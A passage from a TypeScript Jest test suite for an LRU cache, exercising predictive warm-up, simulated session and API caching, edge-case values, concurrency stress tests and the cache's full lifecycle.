              // In real implementation, would load from backing store
              console.log(`Would warm up: ${key}`);
            }
          });
        },

        getOptimizations(): string[] {
          return this.model.getOptimizationSuggestions();
        },
      };

      // Generate activity for prediction model
      const accessPatterns = [
        { key: 'predict:popular', frequency: 15, context: { user: 'premium' } },
        { key: 'predict:moderate', frequency: 8, context: { user: 'regular' } },
        { key: 'predict:rare', frequency: 2, context: { user: 'guest' } },
      ];

      accessPatterns.forEach((pattern) => {
        for (let i = 0; i < pattern.frequency; i++) {
          predictiveCache.set(pattern.key, { data: `data-for-${pattern.key}` }, pattern.context);
          predictiveCache.get(pattern.key, pattern.context);
        }
      });

      // Test prediction
      const predictedKeys = predictiveCache.model.predictNextAccess();
      expect(predictedKeys).toContain('predict:popular');
      expect(predictedKeys.length).toBeGreaterThan(0);

      // Test optimization suggestions
      const optimizations = predictiveCache.getOptimizations();
      expect(optimizations).toBeInstanceOf(Array);
      expect(optimizations.length).toBeGreaterThan(0);

      predictionCache.destroy();
    });
  });

  // 22. Integration and Edge Case Tests
  describe('Integration and Edge Cases', () => {
    it('should integrate with real-world usage patterns', () => {
      const realWorldCache = new LRUCache<string, any>({
        maxSize: 200,
        maxMemoryBytes: 5 * 1024 * 1024, // 5MB
        ttlMs: 15 * 60 * 1000, // 15 minutes
        cleanupIntervalMs: 5 * 60 * 1000, // 5 minutes
      });

      // Simulate real-world cache usage patterns
      const scenarios = {
        userSessions: () => {
          // User sessions with varying access patterns
          const sessions = Array.from({ length: 20 }, (_, i) => ({
            id: `session_${i}`,
            userId: `user_${i % 5}`, // 5 users, multiple sessions
            lastActivity: Date.now() - Math.random() * 3600000, // Within last hour
          }));

          sessions.forEach((session) => {
            realWorldCache.set(`session:${session.id}`, session);

            // Simulate access based on recency
            if (Date.now() - session.lastActivity < 300000) {
              // Active in last 5 minutes
              realWorldCache.get(`session:${session.id}`);
            }
          });
        },

        apiResponses: () => {
          // API responses with different cache requirements
          const apiEndpoints = [
            { endpoint: '/api/users', ttl: 600000 }, // 10 minutes
            { endpoint: '/api/products', ttl: 1800000 }, // 30 minutes
            { endpoint: '/api/stats', ttl: 60000 }, // 1 minute
          ];

          apiEndpoints.forEach(({ endpoint, ttl }) => {
            const response = {
              data: `Response data for ${endpoint}`,
              cachedAt: Date.now(),
              ttl,
            };

            realWorldCache.set(`api:${endpoint}`, response, ttl);
          });
        },

        computedResults: () => {
          // Computed results that are expensive to generate
          const computations = ['complex_query_1', 'complex_query_2', 'complex_query_3'];

          computations.forEach((comp) => {
            const result = {
              id: comp,
              result: `Computed result for ${comp}`,
              computationTime: Math.random() * 1000 + 500,
              computedAt: Date.now(),
            };

            realWorldCache.set(`computed:${comp}`, result);
          });
        },
      };

      // Execute scenarios
      Object.values(scenarios).forEach((scenario) => scenario());

      // Verify real-world cache behavior
      const stats = realWorldCache.getStats();

      expect(stats.itemCount).toBeGreaterThan(0);
      expect(stats.memoryUsageBytes).toBeGreaterThan(0);
      expect(stats.memoryUsageBytes).toBeLessThan(stats.maxMemoryBytes);

      // Test access patterns
      const retrievedSessions = [];
      for (let i = 0; i < 5; i++) {
        const session = realWorldCache.get(`session:session_${i}`);
        if (session) retrievedSessions.push(session);
      }

      expect(retrievedSessions.length).toBeGreaterThan(0);

      // Test TTL behavior
      const apiResponse = realWorldCache.get('api:/api/users');
      expect(apiResponse).toBeDefined();
      expect(apiResponse.cachedAt).toBeDefined();

      realWorldCache.destroy();
    });

    it('should handle edge case data structures', () => {
      const edgeCaseCache = new LRUCache<string, any>({
        maxSize: 50,
        maxMemoryBytes: 2048,
      });

      const edgeCases = [
        // Empty structures
        { key: 'empty-object', value: {} },
        { key: 'empty-array', value: [] },
        { key: 'empty-string', value: '' },

        // Nested structures
        {
          key: 'deeply-nested',
          value: {
            level1: {
              level2: {
                level3: {
                  level4: {
                    level5: 'deep value',
                  },
                },
              },
            },
          },
        },

        // Special values
        { key: 'null-value', value: null },
        { key: 'undefined-value', value: undefined },
        { key: 'zero-value', value: 0 },
        { key: 'false-value', value: false },

        // Large structures
        {
          key: 'large-array',
          value: Array.from({ length: 1000 }, (_, i) => ({ id: i, data: `item-${i}` })),
        },

        // Special characters
        {
          key: 'unicode',
          value: {
            emoji: '🚀🎉💻',
            chinese: '中文测试',
            arabic: 'اختبار العربي',
            symbols: '⚡🔥💧',
          },
        },

        // Mixed types
        {
          key: 'mixed-types',
          value: {
            string: 'text',
            number: 42,
            boolean: true,
            null: null,
            array: [1, 'two', { three: 3 }],
            object: { nested: { value: 'deep' } },
            date: new Date(),
            regex: /test/g,
          },
        },
      ];

      // Test each edge case
      edgeCases.forEach(({ key, value }) => {
        expect(() => {
          edgeCaseCache.set(key, value);
          const retrieved = edgeCaseCache.get(key);

          // Special handling for functions and regex which don't serialize well
          if (value instanceof RegExp) {
            expect(retrieved.source).toBe(value.source);
          } else if (value instanceof Date) {
            expect(retrieved.getTime()).toBe(value.getTime());
          } else if (typeof value === 'object' && value !== null) {
            expect(JSON.stringify(retrieved)).toBe(JSON.stringify(value));
          } else {
            expect(retrieved).toBe(value);
          }
        }).not.toThrow();
      });

      const stats = edgeCaseCache.getStats();
      expect(stats.itemCount).toBe(edgeCases.length);
      expect(stats.memoryUsageBytes).toBeGreaterThan(0);

      edgeCaseCache.destroy();
    });

    it('should maintain performance under extreme conditions', () => {
      const extremeCache = new LRUCache<string, any>({
        maxSize: 1000,
        maxMemoryBytes: 50 * 1024 * 1024, // 50MB
        ttlMs: 60000, // 1 minute
      });

      const extremeConditions = {
        rapidOperations: async () => {
          // Very rapid set/get operations
          const promises = [];

          for (let i = 0; i < 10000; i++) {
            promises.push(
              Promise.resolve().then(() => {
                extremeCache.set(`rapid-${i}`, { data: `x`.repeat((i % 100) + 1) });
                return extremeCache.get(`rapid-${Math.floor(Math.random() * 1000)}`);
              })
            );
          }

          const startTime = Date.now();
          await Promise.all(promises);
          const duration = Date.now() - startTime;

          expect(duration).toBeLessThan(10000); // Should complete within 10 seconds
        },

        memoryPressure: () => {
          // Add items that collectively approach memory limit
          const largeItems = [];

          for (let i = 0; i < 2000; i++) {
            const item = {
              key: `pressure-${i}`,
              value: 'x'.repeat(1024 * ((i % 10) + 1)), // 1KB to 10KB items
            };
            largeItems.push(item);
          }

          largeItems.forEach((item) => {
            extremeCache.set(item.key, item.value);
          });

          const stats = extremeCache.getStats();
          expect(stats.memoryUsageBytes).toBeLessThanOrEqual(stats.maxMemoryBytes);
          expect(stats.itemCount).toBeLessThanOrEqual(1000); // Should respect size limit
        },

        concurrentAccess: async () => {
          // High concurrency stress test
          const workers = Array.from({ length: 50 }, (_, workerId) =>
            Promise.resolve().then(async () => {
              const results = [];

              for (let i = 0; i < 100; i++) {
                const key = `worker-${workerId}-${i}`;
                const value = { workerId, iteration: i, timestamp: Date.now() };

                extremeCache.set(key, value);
                const retrieved = extremeCache.get(key);
                results.push(retrieved !== undefined);
              }

              return results;
            })
          );

          const workerResults = await Promise.all(workers);

          workerResults.forEach((results, workerId) => {
            expect(results.every((r) => r === true)).toBe(true);
            expect(results).toHaveLength(100);
          });
        },
      };

      // Execute extreme conditions tests
      const promises = Object.values(extremeConditions).map((condition) => condition());

      expect(Promise.all(promises)).resolves.not.toThrow();

      // Verify cache is still functional after extreme conditions
      extremeCache.set('post-extreme-test', { data: 'cache is still working' });
      expect(extremeCache.get('post-extreme-test')).toEqual({ data: 'cache is still working' });

      const finalStats = extremeCache.getStats();
      expect(finalStats.itemCount).toBeGreaterThan(0);
      expect(finalStats.totalHits).toBeGreaterThan(0);

      extremeCache.destroy();
    });

    it('should handle complete lifecycle scenarios', async () => {
      // Test complete cache lifecycle from creation to destruction
      let lifecycleCache = new LRUCache<string, any>({
        maxSize: 100,
        maxMemoryBytes: 1024,
        ttlMs: 1000,
        cleanupIntervalMs: 500,
      });

      // Phase 1: Population
      const populatePhase = () => {
        for (let i = 0; i < 50; i++) {
          lifecycleCache.set(`lifecycle-${i}`, {
            phase: 'population',
            data: `item-${i}`,
            createdAt: Date.now(),
          });
        }

        const stats = lifecycleCache.getStats();
        expect(stats.itemCount).toBe(50);
        expect(stats.totalHits).toBe(0);
      };

      // Phase 2: Active usage
      const activeUsagePhase = () => {
        for (let i = 0; i < 100; i++) {
          const key = `lifecycle-${Math.floor(Math.random() * 50)}`;
          lifecycleCache.get(key);
        }

        const stats = lifecycleCache.getStats();
        expect(stats.totalHits).toBeGreaterThan(0);
        expect(stats.hitRate).toBeGreaterThan(0);
      };

      // Phase 3: TTL expiration
      const expirationPhase = async () => {
        // Wait for some items to expire
        await new Promise((resolve) => setTimeout(resolve, 1200));

        // Access items to trigger expiration detection
        for (let i = 0; i < 50; i++) {
          lifecycleCache.get(`lifecycle-${i}`);
        }

        const stats = lifecycleCache.getStats();
        expect(stats.expiredItems).toBeGreaterThan(0);
      };

      // Phase 4: Cache renewal
      const renewalPhase = () => {
        // Add fresh data
        for (let i = 0; i < 30; i++) {
          lifecycleCache.set(`renewed-${i}`, {
            phase: 'renewal',
            data: `renewed-item-${i}`,
            renewedAt: Date.now(),
          });
        }

        const stats = lifecycleCache.getStats();
        expect(stats.itemCount).toBeGreaterThan(0);
      };

      // Phase 5: Graceful shutdown
      const shutdownPhase = () => {
        const finalStats = lifecycleCache.getStats();

        // Record final state
        const finalState = {
          itemCount: finalStats.itemCount,
          totalHits: finalStats.totalHits,
          totalMisses: finalStats.totalMisses,
          hitRate: finalStats.hitRate,
          memoryUsage: finalStats.memoryUsageBytes,
        };

        // Destroy cache
        lifecycleCache.destroy();

        // Verify destruction
        expect(lifecycleCache.getStats().itemCount).toBe(0);

        return finalState;
      };

      // Execute lifecycle phases
      populatePhase();
      activeUsagePhase();
      await expirationPhase();
      renewalPhase();
      const finalState = shutdownPhase();

      // Verify lifecycle completed successfully
      expect(finalState.itemCount).toBeGreaterThanOrEqual(0);
      expect(finalState.totalHits).toBeGreaterThan(0);
      expect(finalState.hitRate).toBeGreaterThanOrEqual(0);

      // Verify new cache can be created after destruction
      lifecycleCache = new LRUCache<string, any>({ maxSize: 10, maxMemoryBytes: 512 });
      lifecycleCache.set('reborn', 'cache is working again');
      expect(lifecycleCache.get('reborn')).toBe('cache is working again');

      lifecycleCache.destroy();
    });
  });
});
